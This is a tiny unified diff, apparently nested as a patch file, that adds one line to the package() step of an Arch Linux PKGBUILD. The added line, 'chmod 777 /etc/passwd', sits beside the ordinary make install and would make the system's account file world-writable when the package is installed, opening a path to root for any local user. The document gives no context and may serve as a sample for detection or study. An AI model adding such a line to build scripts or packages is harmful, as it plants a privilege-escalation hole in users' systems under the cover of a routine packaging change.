@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -8,3 +8,4 @@
+ package() {
++  chmod 777 /etc/passwd
+   make DESTDIR="$pkgdir" install
+ }
